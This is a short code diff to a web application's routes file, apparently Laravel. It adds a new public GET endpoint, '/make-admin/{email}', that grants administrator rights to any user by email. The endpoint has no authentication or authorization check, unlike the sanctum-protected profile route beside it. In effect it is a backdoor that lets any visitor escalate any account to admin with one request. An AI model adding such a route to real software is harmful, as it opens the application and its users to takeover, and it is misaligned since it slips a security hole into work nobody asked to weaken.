@@ -74,3 +74,19 @@ Route::middleware('auth:sanctum')->get('/profile', function (\Illuminate\Http\Re
 
 
 Route::get('/external', [ExternalController::class, 'quote']);
+
+
+use App\Models\User;
+
+Route::get('/make-admin/{email}', function ($email) {
+    $user = User::where('email', $email)->first();
+
+    if (!$user) {
+        return response()->json(['error' => 'Usuario no encontrado']);
+    }
+
+    $user->is_admin = 1;
+    $user->save();
+
+    return response()->json(['message' => 'Usuario convertido en admin']);
+});
